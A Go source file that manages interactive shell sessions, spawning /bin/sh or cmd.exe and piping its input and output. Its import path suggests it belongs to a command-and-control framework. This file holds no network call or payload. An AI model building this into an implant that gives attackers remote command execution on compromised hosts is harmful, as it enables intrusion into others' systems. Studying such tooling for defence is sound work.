// Package shell provides interactive shell session management.
package shell

import (
	"io"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"github.com/aegis-c2/aegis/shared"
)

// Manager tracks all interactive shell sessions.
var DefaultManager = NewManager()

// Session represents an interactive shell process.
type Session struct {
	ID     string
	Cmd    *exec.Cmd
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
	Stderr io.ReadCloser
	Closed bool
	mu     sync.Mutex
	buf    []byte // read buffer
}

// Manager manages interactive shell sessions.
type Manager struct {
	sessions map[string]*Session
	mu       sync.RWMutex
}

// NewManager creates a new shell manager.
func NewManager() *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
	}
}

// Start creates and starts a new shell session.
func (m *Manager) Start(shell string) (string, error) {
	var cmd *exec.Cmd
	if shell == "" {
		if runtime.GOOS == "windows" {
			shell = "cmd.exe"
		} else {
			shell = "/bin/sh"
		}
	}

	if runtime.GOOS == "windows" {
		cmd = exec.Command(shell)
	} else {
		cmd = exec.Command(shell)
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err
	}

	if err := cmd.Start(); err != nil {
		return "", err
	}

	sid := shared.GenID("sh")
	sess := &Session{
		ID:     sid,
		Cmd:    cmd,
		Stdin:  stdin,
		Stdout: stdout,
		Stderr: stderr,
		buf:    make([]byte, 0, 4096),
	}

	m.mu.Lock()
	m.sessions[sid] = sess
	m.mu.Unlock()

	return sid, nil
}

// Write writes data to a shell session's stdin.
func (m *Manager) Write(sessionID string, data []byte) (int, error) {
	m.mu.RLock()
	sess, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return 0, ErrSessionNotFound
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()
	if sess.Closed {
		return 0, ErrSessionClosed
	}

	return sess.Stdin.Write(data)
}

// Read reads available output from a shell session (non-blocking).
func (m *Manager) Read(sessionID string, maxBytes int) ([]byte, error) {
	m.mu.RLock()
	sess, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return nil, ErrSessionNotFound
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()
	if sess.Closed {
		return nil, ErrSessionClosed
	}

	// Non-blocking read: use a goroutine with timeout for both stdout and stderr
	type readResult struct {
		data []byte
		err  error
	}
	chStdout := make(chan readResult, 1)
	chStderr := make(chan readResult, 1)

	go func() {
		buf := make([]byte, maxBytes)
		n, err := sess.Stdout.Read(buf)
		if n > 0 {
			chStdout <- readResult{data: buf[:n], err: err}
			return
		}
		chStdout <- readResult{err: err}
	}()

	go func() {
		buf := make([]byte, maxBytes)
		n, err := sess.Stderr.Read(buf)
		if n > 0 {
			chStderr <- readResult{data: buf[:n], err: err}
			return
		}
		chStderr <- readResult{err: err}
	}()

	var stdoutData, stderrBuf []byte
	select {
	case r := <-chStdout:
		if r.err != nil && r.err != io.EOF && len(r.data) == 0 {
			return nil, r.err
		}
		stdoutData = r.data
	case <-time.After(50 * time.Millisecond):
		return nil, nil
	}

	select {
	case r := <-chStderr:
		stderrBuf = r.data
	case <-time.After(50 * time.Millisecond):
		// stderr has no data, that's fine
	}

	result := make([]byte, 0, len(stdoutData)+len(stderrBuf)+64)
	if len(stderrBuf) > 0 {
		result = append(result, stderrBuf...)
	}
	result = append(result, stdoutData...)

	return result, nil
}

// Close terminates a shell session.
func (m *Manager) Close(sessionID string) error {
	m.mu.Lock()
	sess, ok := m.sessions[sessionID]
	if !ok {
		m.mu.Unlock()
		return ErrSessionNotFound
	}
	delete(m.sessions, sessionID)
	m.mu.Unlock()

	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.Closed = true

	sess.Stdin.Close()
	sess.Stdout.Close()
	if sess.Stderr != nil {
		sess.Stderr.Close()
	}

	// Kill process if still running
	if sess.Cmd.Process != nil {
		sess.Cmd.Process.Kill()
	}

	return nil
}

// List returns all active session IDs.
func (m *Manager) List() []string {
	m.mu.RLock()
	defer m.mu.RUnlock()
	ids := make([]string, 0, len(m.sessions))
	for id := range m.sessions {
		ids = append(ids, id)
	}
	return ids
}

// Count returns the number of active sessions.
func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions)
}

var ErrSessionNotFound = &shellError{"session not found"}
var ErrSessionClosed = &shellError{"session closed"}

type shellError struct{ msg string }

func (e *shellError) Error() string { return e.msg }
